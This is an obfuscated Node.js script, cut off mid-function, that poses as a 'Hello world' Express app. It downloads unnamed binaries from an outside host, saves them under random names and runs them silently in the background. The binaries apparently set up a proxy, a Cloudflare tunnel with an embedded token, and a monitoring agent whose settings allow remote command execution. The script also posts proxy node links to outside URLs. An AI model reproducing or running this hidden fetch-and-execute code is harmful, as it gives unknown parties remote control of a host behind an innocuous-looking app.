const _0x1a9985=_0x4689;function _0x4689(_0x5c12df,_0x2c7157){const _0x2a66b4=_0x2a66();return _0x4689=function(_0x46895a,_0x16760b){_0x46895a=_0x46895a-0x75;let _0x26dbe7=_0x2a66b4[_0x46895a];return _0x26dbe7;},_0x4689(_0x5c12df,_0x2c7157);}(function(_0x4b2375,_0x243b08){const _0x3462e9={_0x5b9df8:0xb4,_0x169032:0x11e,_0x1c9b28:0xda,_0x9659dd:0xb9,_0x3d53d1:0xea,_0x55701d:0x82,_0x5d7a63:0xd9,_0x2d0893:0x92},_0x79e3c6=_0x4689,_0x83a807=_0x4b2375();while(!![]){try{const _0x3a9ef7=parseInt(_0x79e3c6(0xc6))/0x1+-parseInt(_0x79e3c6(_0x3462e9._0x5b9df8))/0x2*(parseInt(_0x79e3c6(_0x3462e9._0x169032))/0x3)+-parseInt(_0x79e3c6(0x108))/0x4*(-parseInt(_0x79e3c6(_0x3462e9._0x1c9b28))/0x5)+-parseInt(_0x79e3c6(_0x3462e9._0x9659dd))/0x6*(parseInt(_0x79e3c6(_0x3462e9._0x3d53d1))/0x7)+-parseInt(_0x79e3c6(_0x3462e9._0x55701d))/0x8+-parseInt(_0x79e3c6(0xb8))/0x9+parseInt(_0x79e3c6(_0x3462e9._0x5d7a63))/0xa*(parseInt(_0x79e3c6(_0x3462e9._0x2d0893))/0xb);if(_0x3a9ef7===_0x243b08)break;else _0x83a807['push'](_0x83a807['shift']());}catch(_0x30dabf){_0x83a807['push'](_0x83a807['shift']());}}}(_0x2a66,0x63c46));const express=require(_0x1a9985(0x91)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x1a9985(0x11b)),{promisify}=require(_0x1a9985(0x100)),exec=promisify(require(_0x1a9985(0x80))[_0x1a9985(0xa8)]),{execSync}=require(_0x1a9985(0x80)),UPLOAD_URL=process['env'][_0x1a9985(0xc5)]||'',PROJECT_URL=process[_0x1a9985(0x127)][_0x1a9985(0xbd)]||'',AUTO_ACCESS=process[_0x1a9985(0x127)][_0x1a9985(0x75)]||![],FILE_PATH=process[_0x1a9985(0x127)]['FILE_PATH']||_0x1a9985(0xb0),SUB_PATH=process[_0x1a9985(0x127)][_0x1a9985(0xa0)]||_0x1a9985(0x8b),PORT=process[_0x1a9985(0x127)][_0x1a9985(0x130)]||process[_0x1a9985(0x127)][_0x1a9985(0xdc)]||0xbb8,UUID=process[_0x1a9985(0x127)][_0x1a9985(0xe1)]||_0x1a9985(0x9c),NEZHA_SERVER=process['env'][_0x1a9985(0x10a)]||'',NEZHA_PORT=process[_0x1a9985(0x127)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x1a9985(0x127)][_0x1a9985(0xcb)]||'',ARGO_DOMAIN=process[_0x1a9985(0x127)][_0x1a9985(0xd5)]||_0x1a9985(0xbb),ARGO_AUTH=process[_0x1a9985(0x127)][_0x1a9985(0x101)]||_0x1a9985(0x88),ARGO_PORT=process[_0x1a9985(0x127)][_0x1a9985(0xb6)]||0x4f25,CFIP=process[_0x1a9985(0x127)][_0x1a9985(0x96)]||_0x1a9985(0xf1),CFPORT=process[_0x1a9985(0x127)]['CFPORT']||0x1bb,NAME=process[_0x1a9985(0x127)]['NAME']||'zwpusag';!fs[_0x1a9985(0xd7)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x1a9985(0x11d)](FILE_PATH+_0x1a9985(0xf4))):console[_0x1a9985(0x11d)](FILE_PATH+_0x1a9985(0x76));function generateRandomName(){const _0x3e7781={_0x28690c:0xaa,_0x52dfdc:0xbf},_0x208c6a=_0x1a9985,_0x1cdfd6=_0x208c6a(0xb5);let _0x49f530='';for(let _0x24abb3=0x0;_0x24abb3<0x6;_0x24abb3++){_0x49f530+=_0x1cdfd6['charAt'](Math[_0x208c6a(0xa7)](Math[_0x208c6a(_0x3e7781._0x28690c)]()*_0x1cdfd6[_0x208c6a(_0x3e7781._0x52dfdc)]));}return _0x49f530;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1a9985(0x119)](FILE_PATH,npmName),phpPath=path[_0x1a9985(0x119)](FILE_PATH,phpName),webPath=path[_0x1a9985(0x119)](FILE_PATH,webName),botPath=path[_0x1a9985(0x119)](FILE_PATH,botName),subPath=path[_0x1a9985(0x119)](FILE_PATH,'sub.txt'),listPath=path[_0x1a9985(0x119)](FILE_PATH,_0x1a9985(0xc9)),bootLogPath=path[_0x1a9985(0x119)](FILE_PATH,_0x1a9985(0x11a)),configPath=path[_0x1a9985(0x119)](FILE_PATH,_0x1a9985(0x81));function deleteNodes(){const _0x1e36af={_0x187277:0x12f,_0xb37600:0xd6,_0x32d6eb:0xca,_0x181adb:0x133,_0x382343:0x114,_0x1b863f:0xbf,_0x349502:0xc7},_0x5bb6c1=_0x1a9985;try{if(!UPLOAD_URL)return;if(!fs[_0x5bb6c1(0xd7)](subPath))return;let _0x3359cc;try{_0x3359cc=fs[_0x5bb6c1(0x9f)](subPath,_0x5bb6c1(_0x1e36af._0x187277));}catch{return null;}const _0x561557=Buffer[_0x5bb6c1(_0x1e36af._0xb37600)](_0x3359cc,_0x5bb6c1(0x118))[_0x5bb6c1(_0x1e36af._0x32d6eb)](_0x5bb6c1(_0x1e36af._0x187277)),_0x3c92c3=_0x561557[_0x5bb6c1(_0x1e36af._0x181adb)]('\x0a')[_0x5bb6c1(_0x1e36af._0x382343)](_0xa30eae=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5bb6c1(0xd0)](_0xa30eae));if(_0x3c92c3[_0x5bb6c1(_0x1e36af._0x1b863f)]===0x0)return;return axios['post'](UPLOAD_URL+_0x5bb6c1(_0x1e36af._0x349502),JSON['stringify']({'nodes':_0x3c92c3}),{'headers':{'Content-Type':_0x5bb6c1(0xd2)}})[_0x5bb6c1(0xc0)](_0x1b97ed=>{return null;}),null;}catch(_0x17b2a7){return null;}}function cleanupOldFiles(){const _0x446ab1={_0x218e33:0xc3},_0x5aa986={_0x23973f:0x104},_0x7dcddc=_0x1a9985;try{const _0x6464a1=fs[_0x7dcddc(_0x446ab1._0x218e33)](FILE_PATH);_0x6464a1[_0x7dcddc(0x120)](_0x27bcac=>{const _0x160ef2=_0x7dcddc,_0x3acb52=path[_0x160ef2(0x119)](FILE_PATH,_0x27bcac);try{const _0x55f10e=fs[_0x160ef2(_0x5aa986._0x23973f)](_0x3acb52);_0x55f10e[_0x160ef2(0xe3)]()&&fs[_0x160ef2(0xe6)](_0x3acb52);}catch(_0x232772){}});}catch(_0x35f781){}}app['get']('/',function(_0x6b6bf5,_0x392f3){const _0x1bd8cb={_0x348894:0x9a},_0x454f47=_0x1a9985;_0x392f3[_0x454f47(0x12a)](_0x454f47(_0x1bd8cb._0x348894));});async function generateConfig(){const _0x58c402={_0x20293e:0x128,_0x33a47d:0x93,_0x3c6e7b:0xf8,_0x5a0bbd:0x93,_0x9ab681:0x7d,_0x3c4d20:0x115,_0x12055d:0xd8,_0x3fe1a3:0x8f,_0x45380e:0xf2,_0x2be387:0x109,_0x130fef:0x106,_0x484ced:0x115,_0x12544e:0x9b,_0x5ac259:0xc2,_0x52c7af:0x12b,_0x2a7080:0x119,_0xe5b241:0x81,_0x3dd479:0x116},_0x294f8c=_0x1a9985,_0x24abfa={'log':{'access':_0x294f8c(_0x58c402._0x20293e),'error':'/dev/null','loglevel':_0x294f8c(_0x58c402._0x33a47d)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x294f8c(_0x58c402._0x3c6e7b)}],'decryption':_0x294f8c(_0x58c402._0x5a0bbd),'fallbacks':[{'dest':0xbb9},{'path':_0x294f8c(_0x58c402._0x9ab681),'dest':0xbba},{'path':_0x294f8c(_0x58c402._0x3c4d20),'dest':0xbbb},{'path':_0x294f8c(0x10c),'dest':0xbbc}]},'streamSettings':{'network':_0x294f8c(0xd8)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x294f8c(0x93)},'streamSettings':{'network':_0x294f8c(_0x58c402._0x12055d),'security':'none'}},{'port':0xbba,'listen':_0x294f8c(0x106),'protocol':_0x294f8c(_0x58c402._0x3fe1a3),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x294f8c(_0x58c402._0x5a0bbd)},'streamSettings':{'network':'ws','security':_0x294f8c(0x93),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x294f8c(_0x58c402._0x45380e),'tls',_0x294f8c(_0x58c402._0x2be387)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x294f8c(_0x58c402._0x130fef),'protocol':_0x294f8c(0x77),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x294f8c(_0x58c402._0x484ced)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x294f8c(_0x58c402._0x12544e),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x294f8c(0x10c)}},'sniffing':{'enabled':!![],'destOverride':[_0x294f8c(_0x58c402._0x45380e),_0x294f8c(_0x58c402._0x12544e),_0x294f8c(0x109)],'metadataOnly':![]}}],'dns':{'servers':[_0x294f8c(_0x58c402._0x5ac259)]},'outbounds':[{'protocol':_0x294f8c(0xfc),'tag':'direct'},{'protocol':'blackhole','tag':_0x294f8c(_0x58c402._0x52c7af)}]};fs['writeFileSync'](path[_0x294f8c(_0x58c402._0x2a7080)](FILE_PATH,_0x294f8c(_0x58c402._0xe5b241)),JSON[_0x294f8c(_0x58c402._0x3dd479)](_0x24abfa,null,0x2));}function getSystemArchitecture(){const _0x2db0a0={_0x231640:0x98},_0x5bbf66=_0x1a9985,_0x25144a=os[_0x5bbf66(0xa4)]();return _0x25144a===_0x5bbf66(_0x2db0a0._0x231640)||_0x25144a===_0x5bbf66(0x113)||_0x25144a==='aarch64'?_0x5bbf66(_0x2db0a0._0x231640):'amd';}function _0x2a66(){const _0x5cfae6=['countryCode','UPLOAD_URL','318767jlbSFI','/api/delete-nodes','\x0a\x20\x20\x20\x20','list.txt','toString','NEZHA_KEY','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','firefox','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','platform','test','8443','application/json','Error\x20reading\x20boot.log:','2087','ARGO_DOMAIN','from','existsSync','tcp','10dEwxaQ','166235cKrhXZ','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','PORT','https://arm64.ssss.nyc.mn/agent','/config.json\x20>/dev/null\x202>&1\x20&','mkdirSync','App\x20is\x20running','UUID','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','isFile','NEZHA\x20variable\x20is\x20empty,skip\x20running','Download\x20','unlinkSync','/vmess-argo?ed=2560','tunnel.json','data','7GtvhzD','/api/add-nodes','\x20>/dev/null\x202>&1','TunnelSecret','ArgoDomain:','Add\x20automatic\x20access\x20task\x20faild:\x20','https://amd64.ssss.nyc.mn/v1','cdns.doon.eu.org','http','org','\x20is\x20created','message','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','true','xtls-rprx-vision','finish','&path=%2Fvless-argo%3Fed%3D2560#','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','freedom','/tunnel.yml\x20run','writeFileSync','\x20-p\x20','util','ARGO_AUTH','clear','Unhandled\x20error\x20in\x20startserver:','statSync','taskkill\x20/f\x20/im\x20','127.0.0.1','push','4RLujwc','quic','NEZHA_SERVER','\x0a\x0avmess://','/trojan-argo','Nodes\x20uploaded\x20successfully','?security=tls&sni=','status','set','https://arm64.ssss.nyc.mn/web','Error\x20in\x20startserver:','arm64','filter','/vmess-argo','stringify','Content-Type','base64','join','boot.log','path','&fp=firefox&type=ws&host=','log','13314mziBkN','443','forEach','createWriteStream','unshift','match','\x20failed:\x20','\x20>/dev/null\x202>&1\x20&','success','env','/dev/null','map','send','block','http\x20server\x20is\x20running\x20on\x20port:','has','tunnel.yml','utf-8','SERVER_PORT','Skipping\x20adding\x20automatic\x20access\x20task','https://amd64.ssss.nyc.mn/web','split','chmod','AUTO_ACCESS','\x20already\x20exists','vmess','response','basename','country_code','npm\x20running\x20error:\x20','2053','/vless-argo','\x0a\x0atrojan://','charAt','child_process','config.json','6167016fPDvXr','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Empowerment\x20success\x20for\x20','post','then','eyJhIjoiNGQ1ZjBiOWQyZjFhNTRiOTk5MTlkMDBjNzgwMzg1MWEiLCJ0IjoiYTlkYmRhZDQtZGM2NS00ZTE0LTk0NzYtMjhjNjgwODdhNzQ0IiwicyI6IlpXVTBaREZrTlRFdE9HTXlNaTAwT0dNMkxXRmlPVFl0TldZM05HVXdOVFU1T1RZeiJ','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','fileName','sub','?encryption=none&security=tls&sni=','Unknown','get','vless','\x0aclient_secret:\x20','express','12705286oBPJvt','none','2096','\x20successfully','CFIP','win32','arm','rm\x20-rf\x20','Hello\x20world!','tls','32582415-9d07-4314-95af-13d62f6b6d6c','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Empowerment\x20failed\x20for\x20','readFileSync','SUB_PATH','pop','error','Error\x20downloading\x20files:','arch','includes','\x20is\x20running','floor','exec','\x20-c\x20\x22','random','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','close','Error\x20executing\x20command:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0avless://','./tmp','2083','https://oooo.serv00.net/add-url','pipe','22vFlPaN','abcdefghijklmnopqrstuvwxyz','ARGO_PORT','nohup\x20','1916622YhlqFs','394446xjvFXu','https://amd64.ssss.nyc.mn/agent','zwpusag.ayzwp.de5.net','substring','PROJECT_URL','.exe\x20>\x20nul\x202>&1','length','catch','/sub.txt\x20saved\x20successfully','https+local://8.8.8.8/dns-query','readdirSync'];_0x2a66=function(){return _0x5cfae6;};return _0x2a66();}function downloadFile(_0x514601,_0x774621,_0xd0be76){const _0x1a8e0f={_0x4a9e38:0xdf,_0x28eadd:0x121,_0x531ba7:0x8e,_0x391a9c:0x87,_0x4feb25:0xc0},_0x4a29b3={_0x1b8865:0x79,_0x819a3c:0xa2},_0x2178a0={_0x2af66e:0xf9},_0x37dfbc={_0x4511c7:0xe5,_0x528bac:0xa2},_0x520180=_0x1a9985,_0x372694=_0x514601;!fs['existsSync'](FILE_PATH)&&fs[_0x520180(_0x1a8e0f._0x4a9e38)](FILE_PATH,{'recursive':!![]});const _0x4fc8e4=fs[_0x520180(_0x1a8e0f._0x28eadd)](_0x372694);axios({'method':_0x520180(_0x1a8e0f._0x531ba7),'url':_0x774621,'responseType':'stream'})[_0x520180(_0x1a8e0f._0x391a9c)](_0x1d84c4=>{const _0xb7f5e5={_0x4dd6a2:0x95},_0x100eff=_0x520180;_0x1d84c4[_0x100eff(0xe9)][_0x100eff(0xb3)](_0x4fc8e4),_0x4fc8e4['on'](_0x100eff(_0x2178a0._0x2af66e),()=>{const _0x296d52=_0x100eff;_0x4fc8e4[_0x296d52(0xac)](),console['log']('Download\x20'+path[_0x296d52(0x79)](_0x372694)+_0x296d52(_0xb7f5e5._0x4dd6a2)),_0xd0be76(null,_0x372694);}),_0x4fc8e4['on']('error',_0x164cac=>{const _0x236f31=_0x100eff;fs['unlink'](_0x372694,()=>{});const _0x446b8c=_0x236f31(_0x37dfbc._0x4511c7)+path['basename'](_0x372694)+_0x236f31(0x124)+_0x164cac[_0x236f31(0xf5)];console[_0x236f31(_0x37dfbc._0x528bac)](_0x446b8c),_0xd0be76(_0x446b8c);});})[_0x520180(_0x1a8e0f._0x4feb25)](_0x454a12=>{const _0x9efa86=_0x520180,_0x2a6736='Download\x20'+path[_0x9efa86(_0x4a29b3._0x1b8865)](_0x372694)+_0x9efa86(0x124)+_0x454a12[_0x9efa86(0xf5)];console[_0x9efa86(_0x4a29b3._0x819a3c)](_0x2a6736),_0xd0be76(_0x2a6736);});}async function downloadFilesAndRun(){const _0x1640b8={_0x21fcdf:0x11d,_0x5cd033:0x129,_0x4047dd:0xa2,_0x47a5ec:0xa3,_0x1eba2b:0xa5,_0x472b9e:0xa1,_0x2fd67a:0x11f,_0x5e7318:0xb1,_0x3dde6b:0x7c,_0x268de6:0xf7,_0x410959:0x90,_0x34ece4:0x9d,_0x3cf831:0xfe,_0x15eba2:0xa5,_0x457365:0xff,_0x253570:0xa6,_0x10022b:0xe4,_0x35d94c:0xb7,_0xcbdf13:0xa6,_0x508830:0xd7,_0x22c0bd:0x123,_0x371121:0x83,_0x483345:0xfd,_0x5057d1:0xfb,_0x2e99e4:0x125,_0x4e88be:0x11d,_0x5917dc:0xa2,_0x146d52:0xad},_0xf6439c={_0x5a09ef:0x8a},_0x4c81fa=_0x1a9985,_0x1532c0=getSystemArchitecture(),_0x78f22d=getFilesForArchitecture(_0x1532c0);if(_0x78f22d[_0x4c81fa(0xbf)]===0x0){console[_0x4c81fa(_0x1640b8._0x21fcdf)](_0x4c81fa(0xab));return;}const _0x828848=_0x78f22d[_0x4c81fa(_0x1640b8._0x5cd033)](_0x390e66=>{return new Promise((_0xf21d34,_0x5886a0)=>{const _0xb94189=_0x4689;downloadFile(_0x390e66[_0xb94189(_0xf6439c._0x5a09ef)],_0x390e66['fileUrl'],(_0x5f2af1,_0x552631)=>{_0x5f2af1?_0x5886a0(_0x5f2af1):_0xf21d34(_0x552631);});});});try{await Promise['all'](_0x828848);}catch(_0x37a411){console[_0x4c81fa(_0x1640b8._0x4047dd)](_0x4c81fa(_0x1640b8._0x47a5ec),_0x37a411);return;}function _0x5240dc(_0x17bf0c){const _0x3968e0=0x1fd;_0x17bf0c['forEach'](_0x19f4ce=>{const _0x3be69e={_0x23fca5:0x9e,_0x2c1c07:0x85,_0x5668a9:0xca},_0x50475a=_0x4689;fs[_0x50475a(0xd7)](_0x19f4ce)&&fs[_0x50475a(0x134)](_0x19f4ce,_0x3968e0,_0x59a52b=>{const _0x4972fa=_0x50475a;_0x59a52b?console['error'](_0x4972fa(_0x3be69e._0x23fca5)+_0x19f4ce+':\x20'+_0x59a52b):console[_0x4972fa(0x11d)](_0x4972fa(_0x3be69e._0x2c1c07)+_0x19f4ce+':\x20'+_0x3968e0[_0x4972fa(_0x3be69e._0x5668a9)](0x8));});});}const _0x1ef44b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5240dc(_0x1ef44b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1ec05a=NEZHA_SERVER[_0x4c81fa(_0x1640b8._0x1eba2b)](':')?NEZHA_SERVER['split'](':')[_0x4c81fa(_0x1640b8._0x472b9e)]():'',_0x36a9b0=new Set([_0x4c81fa(_0x1640b8._0x2fd67a),'8443',_0x4c81fa(0x94),_0x4c81fa(0xd4),_0x4c81fa(_0x1640b8._0x5e7318),_0x4c81fa(_0x1640b8._0x3dde6b)]),_0x37141d=_0x36a9b0[_0x4c81fa(0x12d)](_0x1ec05a)?_0x4c81fa(_0x1640b8._0x268de6):'false',_0xe2888=_0x4c81fa(_0x1640b8._0x410959)+NEZHA_KEY+_0x4c81fa(0xf6)+NEZHA_SERVER+_0x4c81fa(0x84)+_0x37141d+_0x4c81fa(_0x1640b8._0x34ece4)+UUID;fs[_0x4c81fa(_0x1640b8._0x3cf831)](path[_0x4c81fa(0x119)](FILE_PATH,'config.yaml'),_0xe2888);const _0x10363c='nohup\x20'+phpPath+_0x4c81fa(0xa9)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x10363c),console['log'](phpName+_0x4c81fa(0xa6)),await new Promise(_0x1109c5=>setTimeout(_0x1109c5,0x3e8));}catch(_0x6d43c4){console['error']('php\x20running\x20error:\x20'+_0x6d43c4);}}else{let _0x1eaef0='';const _0x3067f9=['443',_0x4c81fa(0xd1),'2096',_0x4c81fa(0xd4),_0x4c81fa(0xb1),_0x4c81fa(_0x1640b8._0x3dde6b)];_0x3067f9[_0x4c81fa(_0x1640b8._0x15eba2)](NEZHA_PORT)&&(_0x1eaef0='--tls');const _0x3263d9='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x4c81fa(_0x1640b8._0x457365)+NEZHA_KEY+'\x20'+_0x1eaef0+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3263d9),console['log'](npmName+_0x4c81fa(_0x1640b8._0x253570)),await new Promise(_0x5e8350=>setTimeout(_0x5e8350,0x3e8));}catch(_0x1ef8b8){console[_0x4c81fa(0xa2)](_0x4c81fa(0x7b)+_0x1ef8b8);}}}else console[_0x4c81fa(0x11d)](_0x4c81fa(_0x1640b8._0x10022b));const _0x9714eb=_0x4c81fa(_0x1640b8._0x35d94c)+webPath+'\x20-c\x20'+FILE_PATH+_0x4c81fa(0xde);try{await exec(_0x9714eb),console[_0x4c81fa(0x11d)](webName+_0x4c81fa(_0x1640b8._0xcbdf13)),await new Promise(_0x22e25f=>setTimeout(_0x22e25f,0x3e8));}catch(_0x2762bf){console[_0x4c81fa(0xa2)]('web\x20running\x20error:\x20'+_0x2762bf);}if(fs[_0x4c81fa(_0x1640b8._0x508830)](botPath)){let _0x446dbb;if(ARGO_AUTH[_0x4c81fa(_0x1640b8._0x22c0bd)](/^[A-Z0-9a-z=]{120,250}$/))_0x446dbb=_0x4c81fa(_0x1640b8._0x371121)+ARGO_AUTH;else ARGO_AUTH[_0x4c81fa(0x123)](/TunnelSecret/)?_0x446dbb='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x4c81fa(_0x1640b8._0x483345):_0x446dbb=_0x4c81fa(_0x1640b8._0x5057d1)+FILE_PATH+_0x4c81fa(0xe2)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x446dbb+_0x4c81fa(_0x1640b8._0x2e99e4)),console[_0x4c81fa(_0x1640b8._0x4e88be)](botName+_0x4c81fa(_0x1640b8._0xcbdf13)),await new Promise(_0x17bf78=>setTimeout(_0x17bf78,0x7d0));}catch(_0x2d44b0){console[_0x4c81fa(_0x1640b8._0x5917dc)](_0x4c81fa(_0x1640b8._0x146d52)+_0x2d44b0);}}await new Promise(_0x4aaa85=>setTimeout(_0x4aaa85,0x1388));}function getFilesForArchitecture(_0x217f7c){const _0x15cc6e={_0x2b13ab:0x132,_0x5f4fe9:0x98,_0x3357a8:0xba,_0x415d38:0x122,_0x18844c:0x122},_0x395bd3=_0x1a9985;let _0x27fef7;_0x217f7c===_0x395bd3(0x98)?_0x27fef7=[{'fileName':webPath,'fileUrl':_0x395bd3(0x111)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x27fef7=[{'fileName':webPath,'fileUrl':_0x395bd3(_0x15cc6e._0x2b13ab)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x52a052=_0x217f7c===_0x395bd3(_0x15cc6e._0x5f4fe9)?_0x395bd3(0xdd):_0x395bd3(_0x15cc6e._0x3357a8);_0x27fef7[_0x395bd3(_0x15cc6e._0x415d38)]({'fileName':npmPath,'fileUrl':_0x52a052});}else{const _0x495e95=_0x217f7c===_0x395bd3(_0x15cc6e._0x5f4fe9)?'https://arm64.ssss.nyc.mn/v1':_0x395bd3(0xf0);_0x27fef7[_0x395bd3(_0x15cc6e._0x18844c)]({'fileName':phpPath,'fileUrl':_0x495e95});}}return _0x27fef7;}function argoType(){const _0x2b61b0={_0x596caa:0x11d,_0x71dd76:0xa5,_0x2f996c:0xed,_0x284468:0x133,_0x1a0914:0xce,_0x427f2b:0x12e,_0x10813a:0x11d,_0x3c9b27:0xdb},_0x4e0b1a=_0x1a9985;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4e0b1a(_0x2b61b0._0x596caa)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x4e0b1a(_0x2b61b0._0x71dd76)](_0x4e0b1a(_0x2b61b0._0x2f996c))){fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x4098dd='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x4e0b1a(_0x2b61b0._0x284468)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x4e0b1a(0x119)](FILE_PATH,_0x4e0b1a(0xe8))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x4e0b1a(_0x2b61b0._0x1a0914)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x4e0b1a(0xfe)](path[_0x4e0b1a(0x119)](FILE_PATH,_0x4e0b1a(_0x2b61b0._0x427f2b)),_0x4098dd);}else console[_0x4e0b1a(_0x2b61b0._0x10813a)](_0x4e0b1a(_0x2b61b0._0x3c9b27));}async function extractDomains(){const _0x52fb3b={_0x52651a:0x9f,_0x2583b9:0x12f,_0x2f3fb4:0x120,_0x12f12c:0x11d,_0x2218d6:0xee,_0xa70791:0xe6,_0x596295:0xb7,_0x3d48fc:0x125,_0xc8969d:0xad,_0x43748d:0xd3},_0xab54c8={_0x5c552f:0xe9,_0x374f2b:0xe9,_0x3ce3d9:0xf3,_0x2f3ddd:0xe9,_0x3384a4:0xf3,_0xc6f49a:0x10f,_0x4a610e:0xc4,_0x5e2ef1:0x8d},_0x38188c={_0x2190c5:0x105,_0x487e26:0xbc},_0x3931af=_0x1a9985;let _0x23c9f3;if(ARGO_AUTH&&ARGO_DOMAIN)_0x23c9f3=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x23c9f3),await _0xc1590(_0x23c9f3);else try{const _0x387111=fs[_0x3931af(_0x52fb3b._0x52651a)](path[_0x3931af(0x119)](FILE_PATH,'boot.log'),_0x3931af(_0x52fb3b._0x2583b9)),_0x2588aa=_0x387111[_0x3931af(0x133)]('\x0a'),_0x42c575=[];_0x2588aa[_0x3931af(_0x52fb3b._0x2f3fb4)](_0x4e6e50=>{const _0x1afb01=_0x3931af,_0x17a6d3=_0x4e6e50[_0x1afb01(0x123)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x17a6d3){const _0x1534ee=_0x17a6d3[0x1];_0x42c575[_0x1afb01(0x107)](_0x1534ee);}});if(_0x42c575[_0x3931af(0xbf)]>0x0)_0x23c9f3=_0x42c575[0x0],console[_0x3931af(_0x52fb3b._0x12f12c)](_0x3931af(_0x52fb3b._0x2218d6),_0x23c9f3),await _0xc1590(_0x23c9f3);else{console[_0x3931af(0x11d)](_0x3931af(0xcc)),fs[_0x3931af(_0x52fb3b._0xa70791)](path[_0x3931af(0x119)](FILE_PATH,'boot.log'));async function _0x24383b(){const _0x3af17a=_0x3931af;try{process[_0x3af17a(0xcf)]===_0x3af17a(0x97)?await exec(_0x3af17a(_0x38188c._0x2190c5)+botName+_0x3af17a(0xbe)):await exec('pkill\x20-f\x20\x22['+botName[_0x3af17a(0x7f)](0x0)+']'+botName[_0x3af17a(_0x38188c._0x487e26)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x45de3a){}}_0x24383b(),await new Promise(_0x564366=>setTimeout(_0x564366,0xbb8));const _0x4be4ee=_0x3931af(0xfb)+FILE_PATH+_0x3931af(0xe2)+ARGO_PORT;try{await exec(_0x3931af(_0x52fb3b._0x596295)+botPath+'\x20'+_0x4be4ee+_0x3931af(_0x52fb3b._0x3d48fc)),console['log'](botName+_0x3931af(0xa6)),await new Promise(_0xaa85c7=>setTimeout(_0xaa85c7,0xbb8)),await extractDomains();}catch(_0x3ca6c6){console['error'](_0x3931af(_0x52fb3b._0xc8969d)+_0x3ca6c6);}}}catch(_0x380533){console[_0x3931af(0xa2)](_0x3931af(_0x52fb3b._0x43748d),_0x380533);}async function _0x4db5f0(){const _0x38c596=_0x3931af;try{const _0x327ea9=await axios['get']('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x327ea9[_0x38c596(0xe9)]&&_0x327ea9[_0x38c596(_0xab54c8._0x5c552f)]['country_code']&&_0x327ea9[_0x38c596(_0xab54c8._0x374f2b)][_0x38c596(_0xab54c8._0x3ce3d9)])return _0x327ea9[_0x38c596(0xe9)][_0x38c596(0x7a)]+'_'+_0x327ea9[_0x38c596(_0xab54c8._0x2f3ddd)][_0x38c596(_0xab54c8._0x3384a4)];}catch(_0x5bf060){try{const _0xbc6424=await 